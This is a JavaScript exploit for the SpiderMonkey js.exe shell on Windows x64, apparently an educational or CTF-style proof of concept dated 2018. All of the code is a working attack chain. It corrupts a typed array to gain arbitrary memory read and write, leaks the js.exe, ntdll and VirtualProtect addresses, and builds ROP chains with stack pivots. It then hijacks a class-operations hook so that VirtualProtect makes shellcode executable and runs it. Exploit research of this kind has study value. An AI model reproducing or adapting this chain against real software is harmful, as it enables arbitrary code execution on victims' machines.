// Axel '0vercl0k' Souchet - 30 September 2018
//
// Exploit for js.exe on Windows x64. Redirect control flow
// to a first gadget that prepares a bit the context as well as
// giving the possibility to redirect control flow on a second gadget
// that pivots the stack into the inline buffer of an Uint8Array object.
// From there, thanks to a small ROP chain I finally pivot the stack in a region
// I can have infinite space.
// The final payload calls VirtualProtect and sets +x on the region which finally
// gives us arbitrary native code execution.
//

const Debug = false;
const dbg = function (p) {
    if(Debug == false) {
        return;
    }

    print('Debug: ' + p);
};

const Smalls = new Array(1, 2, 3, 4);
const U8A = new Uint8Array(8);

print('[*] Smalls is hella blazin rn..');
//Smalls.blaze();

load('utils.js');
load('int64.js');
load('moarutils.js');

//
// Tamper the U8A's byteLength field via Smalls.
//

Smalls[11] = 0x100;

class __Pwn {
    constructor() {
        this.SavedBase = Smalls[13];
    }

    __Access(Addr, LengthOrValues) {
        if(typeof Addr == 'string') {
            Addr = new Int64(Addr);
        }

        const IsRead = typeof LengthOrValues == 'number';
        let Length = LengthOrValues;
        if(!IsRead) {
            Length = LengthOrValues.length;
        }

        if(IsRead) {
            dbg('Read(' + Addr.toString(16) + ', ' + Length + ')');
        } else {
            dbg('Write(' + Addr.toString(16) + ', ' + Length + ')');
        }

        //
        // Fix U8A's byteLength.
        //

        Smalls[11] = Length;

        //
        // Verify that we properly corrupted the length of U8A.
        //

        if(U8A.byteLength != Length) {
            throw "Error: The Uint8Array's length doesn't check out";
        }

        //
        // Fix U8A's base address.
        //

        Smalls[13] = Addr.asDouble();

        if(IsRead) {
            return U8A.slice(0, Length);
        }

        U8A.set(LengthOrValues);
    }

    Read(Addr, Length) {
        return this.__Access(Addr, Length);
    }

    WritePtr(Addr, Value) {
        const Values = new Int64(Value);
        this.__Access(Addr, Values.bytes());
    }

    ReadPtr(Addr) {
        return new Int64(this.Read(Addr, 8));
    }

    AddrOf(Obj) {

        //
        // Fix U8A's byteLength and base.
        //

        Smalls[11] = 8;
        Smalls[13] = this.SavedBase;

        //
        // Smalls is contiguous with U8A. Go and write a jsvalue in its buffer,
        // and then read it out via U8A.
        //

        Smalls[14] = Obj;
        return Int64.fromJSValue(U8A.slice(0, 8));
    }
};

const Pwn = new __Pwn();

//
// Leak a bunch of stuff.
//

const U8AAddress = Pwn.AddrOf(U8A);
dbg('[+] U8A is @ ' + U8AAddress.toString(16));

const emptyelementsheader2js = new Int64(0x14fd2e8);
const js_emptyElementsHeader = Int64.fromDouble(Smalls[9]);
const JSBase = Sub(js_emptyElementsHeader, emptyelementsheader2js);
print('[+] js.exe is @ ' + JSBase.toString(16));

//
// Get KERNEL32!InitializeSListHead which is a forward export
// to ntdll!RtlInitializeSListHead, and KERNEL32!VirtualProtect.
//

const RtlInitializeSListHead = Pwn.ReadPtr(Add(JSBase, 0x190d0d0));
const VirtualProtect = Pwn.ReadPtr(Add(JSBase, 0x190d270));

print('[+] ntdll!RtlInitializeSListHead is @ ' + RtlInitializeSListHead.toString(16));
print('[+] kernel32!VirtualProtect is @ ' + VirtualProtect.toString(16));

//
// From ntdll!RtlInitializeSListHead compute ntdll's base.
//

const NtdllBase = Sub(RtlInitializeSListHead, 0x738b0);
print('[+] ntdll is @ ' + NtdllBase);

//
// Retrieve a bunch of addresses needed to replace Target's clasp_ field.
//

const Target = new Uint8Array(90);
const TargetAddress = Pwn.AddrOf(Target);
const TargetGroup_ = Pwn.ReadPtr(TargetAddress);
const TargetClasp_ = Pwn.ReadPtr(TargetGroup_);
const TargetcOps = Pwn.ReadPtr(Add(TargetClasp_, 0x10));
const TargetClasp_Address = Add(TargetGroup_, 0x0);

const TargetShapeOrExpando_ = Pwn.ReadPtr(Add(TargetAddress, 0x8));
const TargetBase_ = Pwn.ReadPtr(TargetShapeOrExpando_);
const TargetBaseClasp_Address = Add(TargetBase_, 0);

const ShellcodeAddress = Pwn.ReadPtr(
    Add(Pwn.AddrOf(Shellcode), 8 * 7)
);

print('[+] Payload is @ ' + ShellcodeAddress.toString(16));

//
// Prepare the final ROP chain which ..the first ROP chain will pivot to.
//

const RopChainMemorySize = 0x10000;
const RopChainMiddle = RopChainMemorySize / 2;
let Offset2BigRopChain = RopChainMiddle;
const RopChainBackingMemory = new Uint8Array(RopChainMemorySize);
const RopChainBackingMemoryAddress = Pwn.ReadPtr(
    Add(Pwn.AddrOf(RopChainBackingMemory), 8*7)
);

const PAGE_EXECUTE_READWRITE = new Int64(0x40);

const BigRopChain = [
    // 0x1400cc4ec: pop rcx ; ret  ;  (43 found)
    Add(JSBase, 0xcc4ec),
    ShellcodeAddress,

    // 0x1400731da: pop rdx ; ret  ;  (20 found)
    Add(JSBase, 0x731da),
    new Int64(Shellcode.length),

    // 0x14056c302: pop r8 ; ret  ;  (8 found)
    Add(JSBase, 0x56c302),
    PAGE_EXECUTE_READWRITE,

    VirtualProtect,
    // 0x1413f1d09: add rsp, 0x10 ; pop r14 ; pop r12 ; pop rbp ; ret  ;  (1 found)
    Add(JSBase, 0x13f1d09),
    new Int64('0x1111111111111111'),
    new Int64('0x2222222222222222'),
    new Int64('0x3333333333333333'),
    new Int64('0x4444444444444444'),
    ShellcodeAddress,

    // 0x1400e26fd: jmp rbp ;  (30 found)
    Add(JSBase, 0xe26fd)
];

for(Entry of BigRopChain) {
    RopChainBackingMemory.set(Entry.bytes(), Offset2BigRopChain);
    Offset2BigRopChain += 8;
}

dbg('[+] Rop chain backing memory is @ ' + RopChainBackingMemoryAddress.toString(16));

//
// Prepare the first small rop chain. Its purpose is to pivot to
// a place where we have 'infinite' space.
//

let Offset2SmallRopChain = 0x18;
const SmallRopChain = [

    //
    // 0x140079e55: pop rsp ; ret  ;  (179 found)
    //

    Add(JSBase, 0x79e55),

    //
    // Pivot in the middle of the space we reserved for our artifical stack.
    //

    Add(RopChainBackingMemoryAddress, RopChainMiddle),
];

for(Entry of SmallRopChain) {
    Target.set(Entry.bytes(), Offset2SmallRopChain);
    Offset2SmallRopChain += 8;
}

//
// 0:000> u ntdll+000bfda2 l10
// ntdll!TpSimpleTryPost+0x5aeb2:
// 00007fff`b8c4fda2 f5              cmc
// 00007fff`b8c4fda3 ff33            push    qword ptr [rbx]
// 00007fff`b8c4fda5 db4889          fisttp  dword ptr [rax-77h]
// 00007fff`b8c4fda8 5c              pop     rsp
// 00007fff`b8c4fda9 2470            and     al,70h
// 00007fff`b8c4fdab 8b7c2434        mov     edi,dword ptr [rsp+34h]
// 00007fff`b8c4fdaf 85ff            test    edi,edi
// 00007fff`b8c4fdb1 0f884a52faff    js      ntdll!TpSimpleTryPost+0x111 (00007fff`b8bf5001)
//
// 0:000> u 00007fff`b8bf5001
// ntdll!TpSimpleTryPost+0x111:
// 00007fff`b8bf5001 8bc7            mov     eax,edi
// 00007fff`b8bf5003 488b5c2468      mov     rbx,qword ptr [rsp+68h]
// 00007fff`b8bf5008 488b742478      mov     rsi,qword ptr [rsp+78h]
// 00007fff`b8bf500d 4883c440        add     rsp,40h
// 00007fff`b8bf5011 415f            pop     r15
// 00007fff`b8bf5013 415e            pop     r14
// 00007fff`b8bf5015 5f              pop     rdi
// 00007fff`b8bf5016 c3              ret
//

const Pivot2SmallChain = Add(NtdllBase, 0xbfda2).bytes();
for(let Idx = 0; Idx < Pivot2SmallChain.length; Idx++) {
    Target[Idx] = Pivot2SmallChain[Idx];
}

//
// Prepare backing memory for the js::Class object, as well as the js::ClassOps object.
//

// 0:000> ?? sizeof(js!js::Class) + sizeof(js::ClassOps)
// unsigned int64 0x88
const MemoryBackingObject = new Uint8Array(0x88);
const MemoryBackingObjectAddress = Pwn.AddrOf(MemoryBackingObject);
const ClassMemoryBackingAddress = Pwn.ReadPtr(Add(MemoryBackingObjectAddress, 7 * 8));
// 0:000> ?? sizeof(js!js::Class)
// unsigned int64 0x30
const ClassOpsMemoryBackingAddress = Add(ClassMemoryBackingAddress, 0x30);
dbg('[+] js::Class / js::ClassOps backing memory is @ ' + MemoryBackingObjectAddress.toString(16));

//
// Copy the original Class object into our backing memory, and hijack
// the cOps field.
//

MemoryBackingObject.set(Pwn.Read(TargetClasp_, 0x30), 0);
MemoryBackingObject.set(ClassOpsMemoryBackingAddress.bytes(), 0x10);

//
// Copy the original ClassOps object into our backing memory and hijack
// the add property.
//

MemoryBackingObject.set(Pwn.Read(TargetcOps, 0x50), 0x30);
const Pivot = Add(new Int64(JSBase), 0x1085d80);

//
// 0:000> u 00007ff7`60ce5d80
// js!js::irregexp::RegExpLookahead::Accept [c:\users\over\mozilla-central\js\src\irregexp\regexpast.cpp @ 40]:
// 00007ff7`60ce5d80 488b02          mov     rax,qword ptr [rdx]
// 00007ff7`60ce5d83 4c8bca          mov     r9,rdx
// 00007ff7`60ce5d86 488bd1          mov     rdx,rcx
// 00007ff7`60ce5d89 498bc9          mov     rcx,r9
// 00007ff7`60ce5d8c 48ff6040        jmp     qword ptr [rax+40h]
// 0:000> ? 00007ff7`60ce5d80 - js
// Evaluate expression: 17325440 = 00000000`01085d80
//

MemoryBackingObject.set(Pivot.bytes(), 0x30);

//
// At this point, hijack Target's clasp_ fields; from both group and the
// shape. Note that we also update the shape as there's an assert in
// the debug build that makes sure the two classes matches.
//

print("[*] Overwriting Target's clasp_ @ " + TargetClasp_Address.toString(16));
Pwn.WritePtr(TargetClasp_Address, ClassMemoryBackingAddress);
print("[*] Overwriting Target's shape clasp_ @ " + TargetBaseClasp_Address.toString(16));
Pwn.WritePtr(TargetBaseClasp_Address, ClassMemoryBackingAddress);

//
// Let's pull the trigger now.
//

print('[*] Pulling the trigger bebe..');
Target.im_falling_and_i_cant_turn_back = 1;

